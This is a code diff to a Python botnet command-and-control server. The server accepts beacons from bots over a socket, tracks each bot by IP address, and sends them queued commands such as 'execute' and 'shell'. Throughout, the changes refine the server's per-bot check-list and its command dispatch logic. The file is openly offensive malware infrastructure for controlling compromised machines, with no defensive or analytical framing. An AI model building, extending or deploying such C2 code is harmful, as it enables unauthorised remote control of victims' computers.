@@ -6,23 +6,36 @@ from threading import Thread
 
 commands = ["get os","test","execute","shell"]
 inter = 5
-check_list = []
+check_list = {}
 botnet = []
 command = ""
 has_cmd = 0 # 1 --> True 0 --> False
 
-def beacon_handler(s):
-    global inter,command,has_cmd
+def set_vals(n):
+    for bot in check_list:
+        check_list[bot] = n
+
+def beacon_handler(s,addr):
+    global inter,command,has_cmd,check_list
     try:
+        if command != "":
+            command = command.encode()
+        # if has_cmd == 1:
+        #     create_checklist()
+        #     set_vals(1)
         pkt = s.recv(4096)
         len_meta_data = len(pkt) - 4
         data = struct.unpack("<HH",pkt[len_meta_data:])
         if data[0] == 1:
-            cmd_data = struct.unpack("<%ds"%(len_meta_data),pkt[:len_meta_data])
-            cmd_data = cmd_data.decode()
-            # Print output
+            if check_list[addr] == 1:
+                cmd_data = struct.unpack("<%ds"%(len_meta_data),pkt[:len_meta_data])
+                cmd_data = cmd_data.decode()
+                #Print Output
+                check_list[addr] = 0
             if has_cmd == 1:
                 beacon_pkt = struct.pack("<%dsHH"%(len(command)),command,has_cmd,inter)
+                create_checklist()
+                set_vals(1)
         elif data[0] == 0:
             if has_cmd == 1:
                 beacon_pkt = struct.pack("<%dsHH"%(len(command)),command,has_cmd,inter)
@@ -36,7 +49,9 @@ def beacon_handler(s):
 
 def create_checklist():
     global botnet,check_list
-    check_list = botnet
+    keys = botnet
+    for key in keys:
+        check_list[key] = 0
 
 def check_command():
     global command,has_cmd
@@ -59,9 +74,9 @@ def start_server(ip="127.0.0.1",port=2003):
         while True:
             #print("[*] Listening...")
             bot,addr = s.accept()
-            check_bot(str(addr))
+            check_bot(str(addr[0]))
             print("[*] Beacon from %s received"%(str(addr[0])))
-            beacon_handler_thread = Thread(target=beacon_handler,args=(bot,))
+            beacon_handler_thread = Thread(target=beacon_handler,args=(bot,str(addr[0])))
             beacon_handler_thread.start()
             #print("[*] beacon_thread started")
     except Exception as e:
@@ -81,7 +96,6 @@ def process_cmd(cmd):
         has_cmd = 1
         command = cmd
     else:
-        print("[*] Invalid Command")
         return
 
 
